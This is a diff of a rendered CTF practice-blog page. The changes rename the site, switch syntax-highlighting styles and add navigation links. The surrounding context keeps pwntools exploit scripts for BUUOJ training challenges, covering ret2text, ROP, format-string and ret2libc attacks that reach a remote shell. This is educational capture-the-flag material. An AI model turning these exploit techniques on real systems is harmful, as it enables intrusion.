@@ -16,7 +16,7 @@
     
     
       
-        <title>第一页 - PWN刷题记录</title>
+        <title>第一页 - CTF刷题记录</title>
       
     
     
@@ -39,7 +39,7 @@
       
     
     
-      <link rel="stylesheet" href="../../../css/pygments.css">
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
     
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -76,7 +76,7 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="PWN刷题记录" class="md-header__button md-logo" aria-label="PWN刷题记录" data-md-component="logo">
+    <a href="../../.." title="CTF刷题记录" class="md-header__button md-logo" aria-label="CTF刷题记录" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -90,7 +90,7 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            PWN刷题记录
+            CTF刷题记录
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
@@ -171,13 +171,13 @@
 
 <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="PWN刷题记录" class="md-nav__button md-logo" aria-label="PWN刷题记录" data-md-component="logo">
+    <a href="../../.." title="CTF刷题记录" class="md-nav__button md-logo" aria-label="CTF刷题记录" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
 
     </a>
-    PWN刷题记录
+    CTF刷题记录
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -273,6 +273,115 @@
   
   <span class="md-ellipsis">
     第二页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3第三页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第三页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../4第四页/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第四页
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    NSSPWN刷题
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            NSSPWN刷题
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../NSSPWN刷题/1第一页" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    第一页
     
   </span>
   
@@ -643,7 +752,7 @@
 <ul>
 <li>所以就直接<code>ret2text</code>，本题exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./pwn1&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25590</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xf</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
@@ -651,7 +760,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410144600730" src="image-20250410144600730.png" /></p>
 <h2 id="3_warmup_csaw_2016">题目3_warmup_csaw_2016</h2>
 <ul>
@@ -670,7 +778,7 @@
 <ul>
 <li>直接栈溢出<code>ret2text</code>，exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./pwn1&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29233</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x40</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
@@ -678,7 +786,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410145525136" src="image-20250410145525136.png" /></p>
 <h2 id="4_ciscn_2019_n_1">题目4_ciscn_2019_n_1</h2>
 <ul>
@@ -701,7 +808,7 @@
 <ul>
 <li>所以直接溢出修改变量即可</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./ciscn_2019_n_1&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25249</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30</span><span class="o">-</span><span class="mh">0x4</span><span class="p">)</span>
@@ -709,7 +816,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410200654444" src="image-20250410200654444.png" /></p>
 <h2 id="5_pwn1_sctf_2016">题目5_pwn1_sctf_2016</h2>
 <ul>
@@ -740,13 +846,12 @@
 <ul>
 <li>计算得到偏移</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>
 </code></pre></div>
-
 <ul>
 <li>所以exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./pwn1_sctf_2016&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27730</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;I&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">21</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span>
@@ -754,7 +859,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410211231884" src="image-20250410211231884.png" /></p>
 <h2 id="6_jarvisoj_level0">题目6_jarvisoj_level0</h2>
 <ul>
@@ -777,14 +881,13 @@
 <ul>
 <li>直接<code>ret2text</code>，注意在溢出返回到<code>shell</code>的时候需要注意栈需要与<code>0x10</code>对齐，否则程序无法正常执行<code>system("/bin/sh")</code>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level0&#39;</span><span class="p">)</span>
 <span class="c1">#p = remote(&#39;node5.buuoj.cn&#39;,27730)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4005A5</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400596</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410212618785" src="image-20250410212618785.png" /></p>
 <h2 id="7_2019-pwn5">题目7_[第五空间2019 决赛]PWN5</h2>
 <ul>
@@ -806,7 +909,7 @@
 <li>直接使用<code>%10$s</code>写入随机数，这时我们接收随机数输入到那边即可得到<code>shell</code>，注意我们发送的时候要字符串<code>ascii</code>码形式，因为后面有<code>atoi()</code>这个函数。</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./pwn&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26635</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">=</span>  <span class="n">p32</span><span class="p">(</span><span class="mh">0x804C044</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%10$s&#39;</span>
@@ -820,7 +923,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="Snipaste_2025-04-10_22-06-46" src="Snipaste_2025-04-10_22-06-46.png" /></p>
 <p><img alt="image-20250410220655029" src="image-20250410220655029.png" /></p>
 <h2 id="8_jarvisoj_level2">题目8_jarvisoj_level2</h2>
@@ -849,7 +951,7 @@
 <li>这时直接构造<code>32位rop链</code>，注意返回到<code>call System</code>和返回到<code>system</code>的<code>plt</code>表布置栈还稍微有点区别，主要就是返回到<code>system</code>的<code>plt</code>还要填充一个<code>p32(0xdeadbeff)</code>作为返回地址，然后再写入<code>sh_addr</code></li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./level2&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29574</span><span class="p">)</span>
 <span class="n">sh_addr</span> <span class="o">=</span> <span class="mh">0x804A024</span>
@@ -858,7 +960,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410222315099" src="image-20250410222315099.png" /></p>
 <p><img alt="image-20250410222328497" src="image-20250410222328497.png" /></p>
 <h2 id="9_ciscn_2019_n_8">题目9_ciscn_2019_n_8</h2>
@@ -874,7 +975,7 @@
 <ul>
 <li>确认偏移即可，再输入<code>17</code>即可<code>getshell</code></li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_n_8&#39;</span><span class="p">)</span>
 <span class="c1">#p = remote(&#39;node5.buuoj.cn&#39;,29574)</span>
 <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
@@ -883,7 +984,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410224112619" src="image-20250410224112619.png" /></p>
 <p><img alt="image-20250410224117710" src="image-20250410224117710.png" /></p>
 <h2 id="10_bjdctf_2020_babystack">题目10_bjdctf_2020_babystack</h2>
@@ -909,7 +1009,7 @@
 <p>exp如下：</p>
 </li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./bjdctf_2020_babystack&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26437</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;50&#39;</span><span class="p">)</span>
@@ -919,7 +1019,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250410230005911" src="image-20250410230005911.png" /></p>
 <p><img alt="image-20250410230011838" src="image-20250410230011838.png" /></p>
 <h2 id="11_ciscn_2019_c_1">题目11_ciscn_2019_c_1</h2>
@@ -947,7 +1046,7 @@
 <li>此时我们就需要打<code>ret2libc</code></li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./ciscn_2019_c_1&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25616</span><span class="p">)</span>
@@ -976,7 +1075,6 @@
 <span class="c1">#p.sendline(payload)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250411175703431" src="image-20250411175703431.png" /></p>
 <h2 id="12_jarvisoj_level2_x64">题目12_jarvisoj_level2_x64</h2>
 <ul>
@@ -999,7 +1097,7 @@
 <ul>
 <li>简单<code>rop</code>链构造即可，exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2_x64&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25772</span><span class="p">)</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4006b3</span>
@@ -1010,7 +1108,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="Snipaste_2025-04-11_18-05-50" src="Snipaste_2025-04-11_18-05-50.png" /></p>
 <h2 id="13_get_started_3dsctf_2016">题目13_get_started_3dsctf_2016</h2>
 <ul>
@@ -1032,7 +1129,7 @@
 <li>还要注意一点就是，这题并没有开启<code>无缓冲输出</code>，所以在调用完<code>get flag</code>函数时，我们需要返回到<code>main</code>函数，再进行栈溢出，调用<code>fflush(0)</code>，刷新缓冲区。</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./get_started_3dsctf_2016&#39;)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28601</span><span class="p">)</span>
@@ -1046,7 +1143,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250411200020527" src="image-20250411200020527.png" /></p>
 <h2 id="14_harekazectf2019baby_rop">题目14_[HarekazeCTF2019]baby_rop</h2>
 <ul>
@@ -1066,7 +1162,7 @@
 <li>直接栈溢出构造<code>rop</code>链</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="c1">#p = process(&#39;./babyrop&#39;)</span>
 <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400683</span>
@@ -1078,7 +1174,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250411201153272" src="image-20250411201153272.png" /></p>
 <h2 id="15_others_shellcode">题目15_others_shellcode</h2>
 <ul>
@@ -1120,7 +1215,7 @@
 <li>所以我们先使用<code>\x00</code>对程序进行截断操作，然后再向<code>but[7]</code>输入一个数，能造成溢出。（这样stcncmp就不会进行判断，直接返回0）就可以直接进入<code>下一个栈溢出函数</code></li>
 <li>最后就直接栈溢出，exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25643</span><span class="p">)</span>
@@ -1149,7 +1244,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250411212930743" src="image-20250411212930743.png" /></p>
 <h2 id="17_ciscn_2019_n_5">题目17_ciscn_2019_n_5</h2>
 <ul>
@@ -1166,7 +1260,7 @@
 <li>这时我们就可以得到思路，我们将<code>/bin/sh</code>写入到<code>name</code>中，然后正常打<code>ret2libc</code>，注意栈对齐</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28795</span><span class="p">)</span>
@@ -1192,7 +1286,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250411230450166" src="image-20250411230450166.png" /></p>
 <h2 id="18_not_the_same_3dsctf_2016">题目18_not_the_same_3dsctf_2016</h2>
 <ul>
@@ -1213,7 +1306,7 @@
 <li>但是经过尝试好像使用<code>printf</code>函数会报错，具体原因没去查看</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27286</span><span class="p">)</span>
 <span class="c1">#p = process(&#39;./not_the_same_3dsctf_2016&#39;)</span>
@@ -1227,14 +1320,13 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250411232312380" src="image-20250411232312380.png" /></p>
 <h2 id="19_ciscn_2019_en_2">题目19_ciscn_2019_en_2</h2>
 <ul>
 <li>这题与<code>题目11_ciscn_2019_c_1</code>一模一样，只是异或的数据不同，直接照抄该题的exp，将接收到的<code>l</code>修改为<code>o</code>即可。</li>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./ciscn_2019_c_1&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
 <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25580</span><span class="p">)</span>
@@ -1263,7 +1355,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <h2 id="20_ciscn_2019_ne_5">题目20_ciscn_2019_ne_5</h2>
 <ul>
 <li>考点：</li>
@@ -1300,7 +1391,7 @@
 <ul>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">numpy</span> <span class="kn">import</span> <span class="n">put</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">numpy</span> <span class="kn">import</span> <span class="n">put</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./ciscn_2019_ne_5&#39;)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
@@ -1331,7 +1422,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412021754912" src="image-20250412021754912.png" /></p>
 <h2 id="21___2018_rop">题目21_铁人三项(第五赛区)__2018_rop</h2>
 <ul>
@@ -1355,7 +1445,7 @@
 <ul>
 <li>exp如下：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
 <span class="kn">from</span> <span class="nn">numpy</span> <span class="kn">import</span> <span class="n">put</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="c1">#p = process(&#39;./2018_rop&#39;)</span>
@@ -1381,7 +1471,6 @@
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div>
-
 <p><img alt="image-20250412022814260" src="image-20250412022814260.png" /></p>
 <h2 id="22_bjdctf_2020_babystack2">题目22_bjdctf_2020_babystack2</h2>
 <ul>
@@ -1405,7 +1494,7 @@
 <ul>
 <li>exp如下，打的时候注意栈对齐：</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
